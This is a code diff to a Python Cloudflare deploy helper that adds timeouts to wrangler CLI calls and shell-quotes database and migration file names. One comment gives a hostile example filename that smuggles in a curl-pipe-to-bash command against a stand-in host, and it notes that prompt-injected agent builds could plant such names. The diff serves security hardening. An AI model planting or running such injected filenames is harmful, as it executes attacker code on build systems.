@@ -9,15 +9,20 @@ from __future__ import annotations
 
 import os
 import re
+import shlex
 import subprocess
 from pathlib import Path
-from typing import Callable, Optional
+from typing import Optional
 
 # matches *.workers.dev and *.pages.dev deploy URLs
 _URL_RE = re.compile(r"https://[A-Za-z0-9.\-]+\.(?:workers|pages)\.dev\S*")
 
 
-def _env() -> dict:
+# Wall clock for one provider-CLI invocation.
+_CLI_TIMEOUT_S = 900.0
+
+
+def _env() -> dict[str, str]:
     """Env with the writable npm cache workaround (root-owned ~/.npm issue)."""
     e = dict(os.environ)
     e.setdefault("npm_config_cache", str(Path.home() / ".cache" / "npm-area"))
@@ -73,10 +78,16 @@ def provision_d1(app_dir: str | Path) -> tuple[bool, str]:
     log: list[str] = []
     has_mig = (app / "migrations").is_dir()
     for db in d1_db_names(app):
-        c = subprocess.run(
-            ["bash", "-lc", f"printf 'y\\n' | npx -y wrangler d1 create {db} 2>&1"],
-            cwd=str(app), capture_output=True, text=True, env=_env(),
-        )
+        try:
+            c = subprocess.run(
+                ["bash", "-lc", f"printf 'y\\n' | npx -y wrangler d1 create {db} 2>&1"],
+                cwd=str(app), capture_output=True, text=True, env=_env(),
+                timeout=_CLI_TIMEOUT_S,
+            )
+        except subprocess.TimeoutExpired:
+            ok_all = False
+            log.append(f"d1 create {db}: TIMED OUT after {_CLI_TIMEOUT_S:.0f}s")
+            continue
         cout = (c.stdout + c.stderr).lower()
         created = c.returncode == 0 or "already exists" in cout
         ok_all = ok_all and created
@@ -88,12 +99,27 @@ def provision_d1(app_dir: str | Path) -> tuple[bool, str]:
             sqls = sorted((app / "migrations").glob("*.sql"))
             applied = 0
             for sql in sqls:
-                m = subprocess.run(
-                    ["bash", "-lc",
-                     f"printf 'y\\n' | npx -y wrangler d1 execute {db} --remote "
-                     f"--file=migrations/{sql.name} 2>&1"],
-                    cwd=str(app), capture_output=True, text=True, env=_env(),
-                )
+                # shlex.quote the db name AND the migration filename — `sql.name`
+                # is an agent-authored filename (a clone/prompt-injected build can
+                # plant `0001$(curl evil|bash).sql`), so an unquoted interpolation
+                # into `bash -lc` is a command-injection sink (the Vercel path
+                # already quotes; this closes the asymmetry).
+                mig = shlex.quote(f"migrations/{sql.name}")
+                try:
+                    m = subprocess.run(
+                        ["bash", "-lc",
+                         f"printf 'y\\n' | npx -y wrangler d1 execute {shlex.quote(db)} "
+                         f"--remote --file={mig} 2>&1"],
+                        cwd=str(app), capture_output=True, text=True, env=_env(),
+                        timeout=_CLI_TIMEOUT_S,
+                    )
+                except subprocess.TimeoutExpired:
+                    # A migration that timed out may be PARTIALLY applied — say so
+                    # rather than counting it either way.
+                    ok_all = False
+                    log.append(f"d1 migrate {db}: {sql.name} TIMED OUT (may be "
+                               "partially applied)")
+                    continue
                 out = (m.stdout + m.stderr).lower()
                 if m.returncode == 0 or "already exists" in out:
                     applied += 1
@@ -110,14 +136,24 @@ def deploy(app_dir: str | Path) -> tuple[bool, str, Optional[str]]:
     app's `npm run deploy` script, falling back to `npx @vinext/cloudflare deploy`.
     """
     app = Path(app_dir)
+    # The deterministic cf-fix safety net used to run HERE — after the provenance
+    # check — so its mutations shipped un-attested. It now runs in
+    # area.deploy._settle_before_attesting, before verification, where a mutation
+    # refuses the deploy instead of silently changing what ships.
     cmd = [
         "bash",
         "-lc",
         "npm run deploy 2>&1 || npx -y @vinext/cloudflare deploy 2>&1",
     ]
-    proc = subprocess.run(
-        cmd, cwd=str(app), capture_output=True, text=True, env=_env()
-    )
+    try:
+        proc = subprocess.run(
+            cmd, cwd=str(app), capture_output=True, text=True, env=_env(),
+            timeout=_CLI_TIMEOUT_S,
+        )
+    except subprocess.TimeoutExpired:
+        return False, (f"wrangler deploy TIMED OUT after {_CLI_TIMEOUT_S:.0f}s and was "
+                       "killed — the deploy is NOT confirmed either way; check the "
+                       "Cloudflare dashboard before retrying."), None
     out = (proc.stdout + "\n" + proc.stderr).strip()
     m = _URL_RE.search(out)
     return proc.returncode == 0, out[-4000:], (m.group(0) if m else None)
@@ -135,7 +171,17 @@ def rollback(app_dir: str | Path, *, version: Optional[str] = None) -> tuple[boo
         "bash", "-lc",
         f"printf 'y\\n' | npx -y wrangler rollback{ver} --message 'area rollback' 2>&1",
     ]
-    proc = subprocess.run(cmd, cwd=str(app), capture_output=True, text=True, env=_env())
+    # Capped: a wrangler/vercel CLI waiting on a prompt or a stuck upload would
+    # otherwise hang the deploy indefinitely.
+    try:
+        proc = subprocess.run(cmd, cwd=str(app), capture_output=True, text=True,
+                              env=_env(), timeout=_CLI_TIMEOUT_S)
+    except subprocess.TimeoutExpired:
+        # Report a stuck CLI as a failed deploy instead of letting the exception
+        # escape — the caller's contract is (ok, log).
+        return False, (f"wrangler TIMED OUT after {_CLI_TIMEOUT_S:.0f}s and was "
+                       "killed — deploy not confirmed; check the provider dashboard "
+                       "before retrying.")
     out = (proc.stdout + "\n" + proc.stderr).strip()
     return proc.returncode == 0, out[-4000:]
 
